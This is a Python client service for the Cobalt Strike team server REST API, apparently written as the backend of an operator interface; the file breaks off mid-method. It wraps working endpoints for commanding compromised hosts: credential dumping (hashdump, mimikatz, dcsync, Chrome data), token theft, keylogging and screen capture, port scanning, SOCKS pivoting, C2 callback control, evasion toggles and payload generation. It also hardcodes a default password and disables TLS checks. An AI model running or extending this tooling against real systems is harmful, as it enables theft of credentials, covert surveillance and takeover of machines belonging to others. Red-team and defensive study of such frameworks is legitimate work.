"""
Cobalt Strike REST API client service.

Manages JWT authentication, health checking, and beacon operations
through an SSH tunnel to the team server's REST API (port 50443).
"""

import time
import requests
import urllib3

# Disable SSL warnings for self-signed certs on localhost tunnel
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class BeaconService:
    """Client for the Cobalt Strike REST API."""

    def __init__(self):
        self.base_url = "https://localhost:50443"
        self.token = None
        self.token_expires_at = 0
        self.username = "csrestapi"
        self.password = "password"
        self.token_duration_ms = 3600000  # 1 hour
        self.session = requests.Session()
        self.session.verify = False  # Self-signed cert through SSH tunnel
        self.session.timeout = 10

    def configure(self, password=None, port=None):
        """Update connection settings."""
        if password:
            self.password = password
        if port:
            self.base_url = f"https://localhost:{port}"
        # Clear cached token when config changes
        self.token = None
        self.token_expires_at = 0

    def _authenticate(self):
        """Authenticate and obtain JWT bearer token."""
        try:
            resp = self.session.post(
                f"{self.base_url}/api/auth/login",
                json={
                    "username": self.username,
                    "password": self.password,
                    "duration_ms": self.token_duration_ms,
                },
                timeout=5,
            )
            resp.raise_for_status()
            data = resp.json()
            self.token = data.get("access_token")
            # Refresh 5 minutes before expiry
            self.token_expires_at = time.time() + (self.token_duration_ms / 1000) - 300
            self.session.headers["Authorization"] = f"Bearer {self.token}"
            return True
        except Exception:
            self.token = None
            self.token_expires_at = 0
            return False

    def _ensure_auth(self):
        """Ensure we have a valid token, re-authenticating if needed."""
        if not self.token or time.time() >= self.token_expires_at:
            return self._authenticate()
        return True

    def _api_get(self, path):
        """GET helper — authenticate, request, return standardized result."""
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}
        try:
            resp = self.session.get(f"{self.base_url}{path}")
            resp.raise_for_status()
            return {"success": True, "data": resp.json()}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _api_post(self, path, payload=None):
        """POST helper — authenticate, request, return standardized result."""
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}
        try:
            resp = self.session.post(f"{self.base_url}{path}", json=payload or {})
            resp.raise_for_status()
            if resp.content:
                return {"success": True, "data": resp.json()}
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _api_put(self, path, payload=None):
        """PUT helper — authenticate, request, return standardized result."""
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}
        try:
            resp = self.session.put(f"{self.base_url}{path}", json=payload or {})
            resp.raise_for_status()
            if resp.content:
                return {"success": True, "data": resp.json()}
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _api_delete(self, path, payload=None):
        """DELETE helper — authenticate, request, return standardized result."""
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}
        try:
            if payload:
                resp = self.session.delete(f"{self.base_url}{path}", json=payload)
            else:
                resp = self.session.delete(f"{self.base_url}{path}")
            resp.raise_for_status()
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def _api_get_binary(self, path):
        """GET binary content (payloads, screenshots)."""
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}
        try:
            resp = self.session.get(f"{self.base_url}{path}")
            resp.raise_for_status()
            return {"success": True, "content": resp.content, "headers": dict(resp.headers)}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def health_check(self):
        """Check if REST API is reachable and authenticated.

        Returns dict with status, authenticated, error, and detail fields.
        """
        result = {"reachable": False, "authenticated": False, "error": None, "detail": None}

        # Step 1: Check if the SSH tunnel port is open
        import socket
        try:
            # Parse host/port from base_url
            from urllib.parse import urlparse
            parsed = urlparse(self.base_url)
            host = parsed.hostname or "localhost"
            port = parsed.port or 50443
            sock = socket.create_connection((host, port), timeout=3)
            sock.close()
        except ConnectionRefusedError:
            result["error"] = f"Port {port} refused"
            result["detail"] = f"The SSH tunnel is running but nothing is listening on port {port} on the team server. The csrestapi service may not be running — this deployment may not have REST API enabled."
            return result
        except socket.timeout:
            result["error"] = f"Port {port} unreachable"
            result["detail"] = f"Cannot reach {host}:{port}. Ensure the SSH tunnel is running: the tunnel forwards local port {port} to the team server."
            return result
        except OSError as e:
            result["error"] = f"Port check failed: {e}"
            result["detail"] = f"Cannot connect to {host}:{port}. Start the SSH tunnel first."
            return result

        # Step 2: Check if it responds to HTTPS
        try:
            resp = self.session.get(f"{self.base_url}/api/v1", timeout=5)
            result["reachable"] = True
        except requests.exceptions.ConnectionError as e:
            result["error"] = "HTTPS connection failed"
            result["detail"] = f"Port {port} is open but the HTTPS handshake failed. The service may still be starting. Detail: {e}"
            return result
        except requests.exceptions.Timeout:
            result["error"] = "HTTPS request timed out"
            result["detail"] = f"Port {port} is open but the REST API did not respond in time. The csrestapi service may be overloaded or starting up."
            return result
        except Exception as e:
            result["error"] = f"Unexpected error: {type(e).__name__}"
            result["detail"] = str(e)
            return result

        # Step 3: Authenticate
        if self._ensure_auth():
            result["authenticated"] = True
        else:
            result["error"] = "Authentication failed"
            result["detail"] = "The REST API is reachable but login failed. Check the team server password matches what was configured during deployment."

        return result

    def list_beacons(self):
        """List all active beacons."""
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}

        try:
            resp = self.session.get(f"{self.base_url}/api/v1/beacons")
            resp.raise_for_status()
            beacons = resp.json()
            return {"success": True, "beacons": beacons}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def get_beacon(self, bid):
        """Get details for a specific beacon."""
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}

        try:
            resp = self.session.get(f"{self.base_url}/api/v1/beacons/{bid}")
            resp.raise_for_status()
            return {"success": True, "beacon": resp.json()}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def console_command(self, bid, command):
        """Execute a console command on a beacon.

        This is equivalent to typing a command in the Beacon console.
        """
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}

        try:
            resp = self.session.post(
                f"{self.base_url}/api/v1/beacons/{bid}/consoleCommand",
                json={"command": command},
            )
            resp.raise_for_status()
            return {"success": True, "result": resp.json()}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def get_beacon_tasks(self, bid):
        """Get task summary for a beacon."""
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}

        try:
            resp = self.session.get(
                f"{self.base_url}/api/v1/beacons/{bid}/tasks/summary"
            )
            resp.raise_for_status()
            return {"success": True, "tasks": resp.json()}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def get_beacon_tasks_detail(self, bid):
        """Spec: GET /beacons/{bid}/tasks/detail — full task history with results (plain text)."""
        return self._api_get(f"/api/v1/beacons/{bid}/tasks/detail?format=plain")

    def get_beacon_tasks_structured(self, bid):
        """Spec: GET /beacons/{bid}/tasks/detail — full task history with structured results."""
        return self._api_get(f"/api/v1/beacons/{bid}/tasks/detail?format=structured")

    def list_all_tasks(self):
        """Spec: GET /tasks — list all tasks server-wide (all beacons)."""
        return self._api_get("/api/v1/tasks")

    def get_task_detail(self, task_id):
        """Get detailed output for a specific task."""
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}

        try:
            resp = self.session.get(f"{self.base_url}/api/v1/tasks/{task_id}")
            resp.raise_for_status()
            return {"success": True, "task": resp.json()}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def set_sleep(self, bid, sleep_seconds, jitter=0):
        """Set beacon sleep time (seconds) and jitter (0-99)."""
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}

        try:
            resp = self.session.post(
                f"{self.base_url}/api/v1/beacons/{bid}/state/sleepTime",
                json={"sleep": int(sleep_seconds), "jitter": int(jitter)},
            )
            resp.raise_for_status()
            return {"success": True, "result": resp.json()}
        except Exception as e:
            return {"success": False, "error": str(e)}

    # ── File Browser (dedicated endpoints per spec) ──
    def list_directory(self, bid, path=None):
        """Spec: POST /execute/ls — LsDto {path (optional)}."""
        payload = {}
        if path:
            payload["path"] = path
        return self._api_post(f"/api/v1/beacons/{bid}/execute/ls", payload)

    def get_drives(self, bid):
        """Spec: POST /execute/drives — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/drives")

    def make_directory(self, bid, folder):
        """Spec: POST /execute/mkdir — MkdirDto {folder: string}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/mkdir", {"folder": folder})

    def remove_file(self, bid, path):
        """Spec: POST /execute/rm — RmDto {path: string}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/rm", {"path": path})

    def download_file(self, bid, path):
        """Spec: POST /execute/download — DownloadDto {path: string}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/download", {"path": path})

    def upload_file(self, bid, file_ref):
        """Upload a file. Spec: UploadDto {file: string} — @files/ or @artifacts/ reference."""
        return self._api_post(
            f"/api/v1/beacons/{bid}/execute/upload",
            {"file": file_ref},
        )

    # ── Process Browser (dedicated endpoints per spec) ──
    def list_processes(self, bid):
        """Spec: POST /execute/ps — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/ps")

    def kill_process(self, bid, pid):
        """Spec: POST /execute/killProcess — KillDto {pid: int32}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/killProcess", {"pid": int(pid)})

    # ── Screenshots (dedicated spawn endpoints per spec) ──
    def take_screenshot(self, bid):
        """Spec: POST /spawn/screenshot — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/screenshot")

    def start_screenwatch(self, bid):
        """Spec: POST /spawn/screenwatch — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/screenwatch")

    def list_screenshots(self, bid):
        """Get screenshots list for a beacon (filtered from server-wide data)."""
        result = self._api_get("/api/v1/data/screenshots")
        if not result.get("success"):
            return result
        all_screenshots = result.get("data", [])
        if isinstance(all_screenshots, list):
            filtered = [s for s in all_screenshots if str(s.get("bid", "")) == str(bid)]
            return {"success": True, "screenshots": filtered}
        return {"success": True, "screenshots": all_screenshots}

    # ── Token Management (dedicated endpoints per spec) ──
    def make_token(self, bid, domain, user, password):
        """Spec: POST /execute/makeToken/logonName — {domain, user, password}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/makeToken/logonName", {
            "domain": domain, "user": user, "password": password,
        })

    def steal_token(self, bid, pid):
        """Spec: POST /execute/stealToken — StealTokenDto {pid: int32, accessMask?}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/stealToken", {"pid": int(pid)})

    def rev2self(self, bid):
        """Spec: POST /execute/rev2self — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/rev2self")

    def get_uid(self, bid):
        """Spec: POST /execute/getUid — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/getUid")

    # ── Jobs & Downloads (dedicated endpoints per spec) ──
    def list_jobs(self, bid):
        """Spec: POST /state/jobs — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/state/jobs")

    def kill_job(self, bid, jid):
        """Spec: POST /execute/jobStop — JobKillDto {jid: int32}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/jobStop", {"jid": int(jid)})

    def list_downloads(self, bid):
        """List completed downloads (server-wide)."""
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}
        try:
            resp = self.session.get(f"{self.base_url}/api/v1/data/downloads")
            resp.raise_for_status()
            return {"success": True, "downloads": resp.json()}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def list_active_downloads(self, bid):
        """Spec: GET /beacons/{bid}/activeDownloads — in-progress file transfers."""
        return self._api_get(f"/api/v1/beacons/{bid}/activeDownloads")

    def cancel_download(self, bid, file_path):
        """Spec: POST /execute/cancelFileDownload — FileDownloadCancelDto {file: string}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/cancelFileDownload", {"file": file_path})

    # ── Credentials (using spawn endpoints per spec) ──
    def hashdump(self, bid):
        """Spec: POST /spawn/hashdump — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/hashdump")

    def logonpasswords(self, bid):
        """Spec: POST /spawn/logonPasswords — no DTO."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/logonPasswords")

    def dcsync(self, bid, domain, user):
        """Spec: POST /spawn/dcsync — DcSyncSpawnDto {domain (required), user (optional)}."""
        payload = {"domain": domain}
        if user:
            payload["user"] = user
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/dcsync", payload)

    def mimikatz(self, bid, args):
        """Spec: POST /spawn/mimikatz — MimikatzSpawnDto {command, mode}."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/mimikatz", {"command": args, "mode": "normal"})

    # ── Network Recon ──
    # CS uses singular forms for some net subcommands
    _NET_CMD_MAP = {
        "computers": "computers",
        "dclist": "dclist",
        "domain": "domain",
        "groups": "group",
        "users": "user",
        "shares": "share",
        "sessions": "sessions",
        "logons": "logons",
        "trusts": "domain_trusts",
    }

    def net_command(self, bid, subcmd, target=None):
        """Run a net command. Maps frontend names to actual CS command syntax."""
        cs_subcmd = self._NET_CMD_MAP.get(subcmd, subcmd)
        cmd = f"net {cs_subcmd}"
        if target:
            cmd += f" {target}"
        return self.console_command(bid, cmd)

    def portscan(self, bid, targets, ports, method="arp"):
        """Spec: POST /spawn/portscan — PortScanSpawnDto. Wraps string args as arrays."""
        if isinstance(targets, str):
            targets = [targets] if targets else []
        if isinstance(ports, str):
            ports = [ports] if ports else []
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/portscan", {
            "targets": targets, "ports": ports, "method": method, "maxConnections": 1024,
        })

    # ── Pivoting (dedicated endpoints per spec) ──
    def socks_start(self, bid, port, version="socks5"):
        """Spec: POST /execute/socks5Start or socks4Start — {port: int32}."""
        endpoint = "socks5Start" if version == "socks5" else "socks4Start"
        return self._api_post(f"/api/v1/beacons/{bid}/execute/{endpoint}", {"port": int(port)})

    def socks_stop(self, bid, port=None):
        """Spec: POST /execute/socksStop/all or socksStop/{port}."""
        if port:
            return self._api_post(f"/api/v1/beacons/{bid}/execute/socksStop/{int(port)}")
        return self._api_post(f"/api/v1/beacons/{bid}/execute/socksStop/all")

    def rportfwd_start(self, bid, bind_port, fwd_host, fwd_port):
        """Spec: POST /execute/rportfwdStart/onTeamserver — RportForwardBindDto."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/rportfwdStart/onTeamserver", {
            "bindPort": int(bind_port), "forwardHost": fwd_host, "forwardPort": int(fwd_port),
        })

    def rportfwd_stop(self, bid, bind_port):
        """Spec: POST /execute/rportfwdStop/onTeamserver — RportFwdStopDto {bindPort}."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/rportfwdStop/onTeamserver", {
            "bindPort": int(bind_port),
        })

    # ── Listeners ──
    def list_listeners(self):
        """List all listeners."""
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}
        try:
            resp = self.session.get(f"{self.base_url}/api/v1/listeners")
            resp.raise_for_status()
            return {"success": True, "listeners": resp.json()}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def get_listener(self, lid):
        """Get listener details."""
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}
        try:
            resp = self.session.get(f"{self.base_url}/api/v1/listeners/{lid}")
            resp.raise_for_status()
            return {"success": True, "listener": resp.json()}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def delete_listener(self, lid):
        """Delete a listener."""
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}
        try:
            resp = self.session.delete(f"{self.base_url}/api/v1/listeners/{lid}")
            resp.raise_for_status()
            return {"success": True}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def create_listener(self, listener_type, config):
        """Create a listener. Type: http, https, dns, smb, tcp."""
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}
        try:
            resp = self.session.post(
                f"{self.base_url}/api/v1/listeners/{listener_type}",
                json=config,
            )
            resp.raise_for_status()
            return {"success": True, "listener": resp.json()}
        except Exception as e:
            return {"success": False, "error": str(e)}

    # ── Beacon Config (dedicated REST API endpoints per OpenAPI spec) ──
    # IMPORTANT: Always refer to docs/cobalt-strike-api/spec.js for correct
    # DTO field names and types. Do NOT guess field names.
    def set_spawnto(self, bid, arch, path):
        """Set spawnto process. Spec: SpawnToDto {arch: x86|x64, path: string}."""
        return self._api_post(
            f"/api/v1/beacons/{bid}/state/spawnto",
            {"arch": arch, "path": path},
        )

    def set_ppid(self, bid, pid):
        """Set parent PID. Spec: PpidDto {pid: int32}."""
        return self._api_post(
            f"/api/v1/beacons/{bid}/state/ppid",
            {"pid": int(pid)},
        )

    def clear_ppid(self, bid):
        """Reset parent PID to default. Spec: DELETE /state/ppid."""
        return self._api_delete(f"/api/v1/beacons/{bid}/state/ppid")

    def set_blockdlls(self, bid, enabled):
        """Block non-Microsoft DLLs. Spec: separate enable/disable endpoints."""
        if enabled:
            return self._api_post(f"/api/v1/beacons/{bid}/state/blockdlls/enable")
        else:
            return self._api_post(f"/api/v1/beacons/{bid}/state/blockdlls/disable")

    def set_argue(self, bid, command, args):
        """Set argument spoofing. Spec: SpoofedArgumentsAddDto {command, fakeArguments}."""
        return self._api_post(
            f"/api/v1/beacons/{bid}/state/spoofedArguments",
            {"command": command, "fakeArguments": args},
        )

    def set_dns_mode(self, bid, mode):
        """Set DNS beacon mode. Spec: DnsModeDto {mode: string}."""
        return self._api_post(
            f"/api/v1/beacons/{bid}/state/dnsMode",
            {"mode": mode},
        )

    # ── BOF Execution (BETA — CS 4.12+) ──
    def execute_bof_string(self, bid, bof, entrypoint="go", arguments="", files=None):
        """Execute BOF with string arguments."""
        payload = {"bof": bof, "entrypoint": entrypoint, "arguments": arguments}
        if files:
            payload["files"] = files
        return self._api_post(f"/api/v1/beacons/{bid}/execute/bof/string", payload)

    def execute_bof_pack(self, bid, bof, entrypoint="go", arguments=None, files=None):
        """Execute BOF with typed/packed arguments (preferred method)."""
        payload = {"bof": bof, "entrypoint": entrypoint}
        if arguments:
            payload["arguments"] = arguments
        if files:
            payload["files"] = files
        return self._api_post(f"/api/v1/beacons/{bid}/execute/bof/pack", payload)

    def execute_bof_packed(self, bid, bof, entrypoint="go", arguments="", files=None):
        """Execute BOF with pre-packed binary arguments."""
        payload = {"bof": bof, "entrypoint": entrypoint, "arguments": arguments}
        if files:
            payload["files"] = files
        return self._api_post(f"/api/v1/beacons/{bid}/execute/bof/packed", payload)

    # ── Artifacts ──
    def list_artifacts(self):
        """List available artifacts on the team server."""
        return self._api_get("/api/v1/artifacts")

    # ── Token Store (BETA — CS 4.12+) ──
    def token_store_list(self, bid):
        """List stored tokens."""
        return self._api_post(f"/api/v1/beacons/{bid}/state/tokenStore")

    def token_store_steal(self, bid, pid):
        """Steal token from process and store it. Spec: pids (array of int32)."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/tokenStore/steal", {"pids": [int(pid)]})

    def token_store_use(self, bid, token_id):
        """Use a stored token by ID."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/tokenStore/use", {"id": token_id})

    def token_store_steal_and_use(self, bid, pid):
        """Steal token from process and immediately apply it."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/tokenStore/stealAndUse", {"pid": pid})

    def token_store_remove(self, bid, token_ids):
        """Remove specific tokens by IDs."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/tokenStore/remove", {"ids": token_ids})

    def token_store_remove_all(self, bid):
        """Remove all stored tokens."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/tokenStore/removeAll")

    # ── Credential Vault (server-wide) ──
    def list_credentials(self):
        """List all credentials across all beacons."""
        return self._api_get("/api/v1/data/credentials")

    def add_credential(self, credential):
        """Add a credential manually."""
        return self._api_post("/api/v1/data/credentials", credential)

    def get_credential(self, cred_id):
        """Get a specific credential."""
        return self._api_get(f"/api/v1/data/credentials/{cred_id}")

    def delete_credential(self, cred_id):
        """Delete a credential."""
        return self._api_delete(f"/api/v1/data/credentials/{cred_id}")

    # ── C2 Host Management (BETA) ──
    def get_c2_hosts(self, bid):
        """Get beacon callback host information."""
        return self._api_get(f"/api/v1/beacons/{bid}/state/c2/host")

    def add_c2_host(self, bid, infos):
        """Add callback hosts. infos: [{"hostname": "...", "uri": "..."}]"""
        return self._api_post(f"/api/v1/beacons/{bid}/state/c2/host", {"infos": infos})

    def update_c2_host(self, bid, infos):
        """Update callback hosts. infos: [{"fromHost": "...", "toHost": "...", "toUri": "..."}]"""
        return self._api_put(f"/api/v1/beacons/{bid}/state/c2/host", {"infos": infos})

    def delete_c2_host(self, bid, hostnames):
        """Delete callback hosts."""
        return self._api_delete(f"/api/v1/beacons/{bid}/state/c2/host", {"hostnames": hostnames})

    def hold_c2_host(self, bid, hostnames):
        """Hold (pause) callback hosts."""
        return self._api_post(f"/api/v1/beacons/{bid}/state/c2/host/hold", {"hostnames": hostnames})

    def release_c2_host(self, bid, hostnames):
        """Release held callback hosts."""
        return self._api_post(f"/api/v1/beacons/{bid}/state/c2/host/release", {"hostnames": hostnames})

    def reset_c2_host(self, bid, action="all", hostnames=None):
        """Reset callback host stats. action: all|status|statistics"""
        payload = {"action": action}
        if hostnames:
            payload["hostnames"] = hostnames
        return self._api_post(f"/api/v1/beacons/{bid}/state/c2/host/reset", payload)

    def get_c2_host_profiles(self, bid):
        """List host profiles."""
        return self._api_get(f"/api/v1/beacons/{bid}/state/c2/host/profiles")

    def get_failover_notification(self, bid):
        """Get failover notification setting."""
        return self._api_get(f"/api/v1/beacons/{bid}/state/c2/failoverNotification")

    def enable_failover_notification(self, bid):
        """Enable failover notifications."""
        return self._api_post(f"/api/v1/beacons/{bid}/state/c2/failoverNotification/enable")

    def disable_failover_notification(self, bid):
        """Disable failover notifications."""
        return self._api_post(f"/api/v1/beacons/{bid}/state/c2/failoverNotification/disable")

    # ── Beacon Gate & Syscall (BETA — Evasion Toggles) ──
    def enable_beacon_gate(self, bid):
        """Enable Beacon Gate (sleep mask API proxying)."""
        return self._api_post(f"/api/v1/beacons/{bid}/state/beaconGate/enable")

    def disable_beacon_gate(self, bid):
        """Disable Beacon Gate."""
        return self._api_post(f"/api/v1/beacons/{bid}/state/beaconGate/disable")

    def get_syscall_method(self, bid):
        """Get current syscall method (None/Direct/Indirect)."""
        return self._api_get(f"/api/v1/beacons/{bid}/state/syscallMethod")

    def set_syscall_method(self, bid, method):
        """Set syscall method. method: None, Direct, or Indirect."""
        return self._api_post(f"/api/v1/beacons/{bid}/state/syscallMethod", {"method": method})

    # ── Payload Generation (BETA) ──
    def generate_stageless_payload(self, config):
        """Generate a stageless payload with full evasion options."""
        return self._api_post("/api/v1/payloads/generate/stageless", config)

    def generate_stager_payload(self, config):
        """Generate a stager payload."""
        return self._api_post("/api/v1/payloads/generate/stager", config)

    def get_payload(self, filename):
        """Download a generated payload file (binary)."""
        return self._api_get_binary(f"/api/v1/payloads/{filename}")

    # ── Server Config (may return plain text, not JSON) ──
    def _api_get_text(self, path):
        """GET helper for endpoints that may return plain text instead of JSON."""
        if not self._ensure_auth():
            return {"success": False, "error": "Not authenticated"}
        try:
            resp = self.session.get(f"{self.base_url}{path}")
            resp.raise_for_status()
            try:
                return {"success": True, "data": resp.json()}
            except Exception:
                return {"success": True, "data": resp.text.strip()}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def get_killdate(self):
        """Get the beacon kill date."""
        return self._api_get_text("/api/v1/config/killdate")

    def get_malleable_profile(self):
        """Get the active Malleable C2 profile."""
        return self._api_get_text("/api/v1/config/profile")

    def get_system_information(self):
        """Get team server system information."""
        return self._api_get_text("/api/v1/config/systeminformation")

    def get_teamserver_ip(self):
        """Get team server IP."""
        return self._api_get_text("/api/v1/config/teamserverIp")

    def reset_data(self):
        """Reset the data model (destructive!)."""
        return self._api_delete("/api/v1/config/resetData")

    # ── Beacon Management ──
    def delete_beacon(self, bid):
        """Delete/remove a beacon."""
        return self._api_delete(f"/api/v1/beacons/{bid}")

    def clear_command_queue(self, bid):
        """Clear pending command queue for a beacon."""
        return self._api_post(f"/api/v1/beacons/{bid}/clearCommandQueue")

    def force_checkin(self, bid):
        """Force a DNS beacon to check in."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/checkIn")

    def set_beacon_note(self, bid, note):
        """Set a note on a beacon."""
        return self._api_post(f"/api/v1/beacons/{bid}/note", {"note": note})

    # ── Listener Editing ──
    def update_listener(self, listener_type, name, config):
        """Update an existing listener."""
        return self._api_put(f"/api/v1/listeners/{listener_type}/{name}", config)

    # ── Screenshots Gallery (server-wide) ──
    def list_all_screenshots(self):
        """List all screenshots across all beacons."""
        return self._api_get("/api/v1/data/screenshots")

    def get_screenshot(self, screenshot_id):
        """Get a specific screenshot."""
        return self._api_get(f"/api/v1/data/screenshots/{screenshot_id}")

    def delete_screenshot(self, screenshot_id):
        """Delete a screenshot."""
        return self._api_delete(f"/api/v1/data/screenshots/{screenshot_id}")

    # ── Keystrokes (server-wide) ──
    def list_all_keystrokes(self):
        """List all keystrokes across all beacons."""
        return self._api_get("/api/v1/data/keystrokes")

    def list_beacon_keystrokes(self, bid):
        """List keystrokes for a specific beacon."""
        return self._api_get(f"/api/v1/beacons/{bid}/keystrokes")

    def delete_keystrokes(self, keystroke_id):
        """Delete keystroke log."""
        return self._api_delete(f"/api/v1/data/keystrokes/{keystroke_id}")

    # ── Downloads Manager (server-wide) ──
    def list_all_downloads(self):
        """List all downloads across all beacons."""
        return self._api_get("/api/v1/data/downloads")

    def get_download(self, download_id):
        """Get a specific download."""
        return self._api_get(f"/api/v1/data/downloads/{download_id}")

    def delete_download(self, download_id):
        """Delete a download."""
        return self._api_delete(f"/api/v1/data/downloads/{download_id}")

    # ── Beacon Info (BETA — CS 4.12+) ──
    def get_beacon_info(self, bid):
        """Get beacon memory diagnostics (base address, sections, heap, sleepmask)."""
        return self._api_post(f"/api/v1/beacons/{bid}/execute/beaconInfo")

    # ── Spawn/Inject Variants (BETA) ──
    # These dedicated endpoints offer spawn (fork&run) or inject (into PID) modes
    def spawn_hashdump(self, bid):
        """Hashdump via spawn (fork&run)."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/hashdump")

    # All inject DTOs require 'arch' (x86|x64) + 'pid' (int32).
    # All spawn DTOs may have no required body fields.
    # Refer to docs/cobalt-strike-api/spec.js for exact schemas.

    def inject_hashdump(self, bid, pid, arch="x64"):
        """Spec: HashDumpInjectDto {arch, pid} — both required."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/hashdump", {"arch": arch, "pid": int(pid)})

    def spawn_logonpasswords(self, bid):
        """Spec: LogonPasswordsSpawnDto — no required fields."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/logonPasswords")

    def inject_logonpasswords(self, bid, pid, arch="x64"):
        """Spec: LogonPasswordsInjectDto {arch, pid} — both required."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/logonPasswords", {"arch": arch, "pid": int(pid)})

    def spawn_dcsync(self, bid, domain, user=None):
        """Spec: DcSyncSpawnDto {domain (required), user (optional)}."""
        payload = {"domain": domain}
        if user:
            payload["user"] = user
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/dcsync", payload)

    def inject_dcsync(self, bid, pid, arch="x64", domain="", user=None):
        """Spec: DcSyncInjectDto {arch, pid, domain (required), user (optional)}."""
        payload = {"arch": arch, "pid": int(pid), "domain": domain}
        if user:
            payload["user"] = user
        return self._api_post(f"/api/v1/beacons/{bid}/inject/dcsync", payload)

    def spawn_mimikatz(self, bid, command="", mode="normal"):
        """Spec: MimikatzSpawnDto {command, mode} — both required."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/mimikatz", {"command": command, "mode": mode})

    def inject_mimikatz(self, bid, pid, command="", mode="normal", arch="x64"):
        """Spec: MimikatzInjectDto {arch, command, mode, pid} — all required."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/mimikatz", {
            "arch": arch, "command": command, "mode": mode, "pid": int(pid),
        })

    def spawn_chromedump(self, bid):
        """Spec: ChromeDumpSpawnDto — no required fields."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/chromedump")

    def inject_chromedump(self, bid, pid, arch="x64"):
        """Spec: ChromeDumpInjectDto {arch, pid} — both required."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/chromedump", {"arch": arch, "pid": int(pid)})

    def spawn_screenshot(self, bid):
        """Spec: ScreenshotSpawnDto — no required fields."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/screenshot")

    def inject_screenshot(self, bid, pid, arch="x64"):
        """Spec: ScreenshotInjectDto {arch, pid} — both required."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/screenshot", {"arch": arch, "pid": int(pid)})

    def spawn_keylogger(self, bid):
        """Spec: KeyLoggerSpawnDto — no required fields."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/keylogger")

    def inject_keylogger(self, bid, pid, arch="x64"):
        """Spec: KeyLoggerInjectDto {arch, pid} — both required."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/keylogger", {"arch": arch, "pid": int(pid)})

    def spawn_screenwatch(self, bid):
        """Spec: ScreenwatchSpawnDto — no required fields."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/screenwatch")

    def inject_screenwatch(self, bid, pid, arch="x64"):
        """Spec: ScreenwatchInjectDto {arch, pid} — both required."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/screenwatch", {"arch": arch, "pid": int(pid)})

    def spawn_printscreen(self, bid):
        """Spec: PrintScreenSpawnDto — no required fields."""
        return self._api_post(f"/api/v1/beacons/{bid}/spawn/printscreen")

    def inject_printscreen(self, bid, pid, arch="x64"):
        """Spec: PrintScreenInjectDto {arch, pid} — both required."""
        return self._api_post(f"/api/v1/beacons/{bid}/inject/printscreen", {"arch": arch, "pid": int(pid)})

    def spawn_portscan(self, bid, targets=None, ports=None, method="arp", max_connections=1024):
